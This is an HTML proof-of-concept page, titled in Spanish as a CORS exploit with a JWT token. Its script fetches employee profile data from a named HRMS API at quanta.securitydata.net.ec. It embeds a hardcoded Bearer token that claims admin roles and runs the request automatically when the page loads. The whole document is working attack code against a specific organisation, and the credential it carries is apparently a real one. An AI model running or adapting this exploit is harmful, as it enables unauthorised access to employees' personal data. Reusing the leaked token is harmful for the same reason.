<!DOCTYPE html>
<html>
<head>
    <title>PoC - Explotación CORS con Token JWT</title>
</head>
<body>
    <h2>Explotación CORS con Token JWT</h2>
    <button onclick="obtenerPerfilEmpleado()">Ejecutar Exploit</button>

    <script>
    async function obtenerPerfilEmpleado() {
        const url = "https://quanta.securitydata.net.ec/api/v1/hrms/employees/profile";

        const headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8,zh-TW;q=0.7,zh;q=0.6",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6WyJVU0VSIiwiQURNSU4iXSwic3ViIjoiMDk1NzQzNjA1OCIsImlhdCI6MTc0MTI5Mzc2MSwiZXhwIjoxNzQyNTAzMzYxfQ.JAj09CR-BYk86OHJBkzRzUlf4uc8JNFgpUOs3wN5QEQ",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://quanta.securitydata.net.ec/sistema-hrms/index.html",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "sec-ch-ua": `"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"Windows"`
        };

        try {
            const response = await fetch(url, { method: "GET", headers });

            if (!response.ok) {
                throw new Error(`Error HTTP: ${response.status}`);
            }

            const data = await response.json();
            console.log("Datos del perfil del empleado:", data);
        } catch (error) {
            console.error("Error al obtener el perfil del empleado:", error);
        }
    }

    // Llamar a la función para obtener los datos
    obtenerPerfilEmpleado();
</script>

</body>
</html>
